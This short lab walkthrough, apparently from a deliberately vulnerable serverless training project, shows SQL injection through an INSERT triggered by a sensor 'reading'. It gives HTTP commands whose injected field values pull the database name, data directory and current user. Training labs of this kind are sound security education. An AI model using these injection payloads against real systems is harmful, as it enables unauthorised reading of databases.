## SQL Injection - Event Injection

This is a slightly unconventional SQL Injection attack, in that, its triggered on an INSERT statement.

The SQLi can be triggered by tampering with the "reading" from the "sensor", you can trigger a SQL Injection attack on the INSERT Statement.

You can leverage mysql functions, global variables, etc for the attack

* Run `http GET https://f20ymqtwal.execute-api.us-east-1.amazonaws.com/api/test_insert`
* Run `http POST https://f20ymqtwal.execute-api.us-east-1.amazonaws.com/api/publish/testesh reading="(SELECT DATABASE())"`

Substitute `(SELECT DATABASE())` with `(SELECT @@datadir), (SELECT user()), (SELECT CURRENT_USER())`

* Run `cd /root/DVFaaS-Damn-Vulnerable-Functions-as-a-Service/injection/mqtt_rds_sql_event_injection`
* Run `cat app.py`

Let's look at the code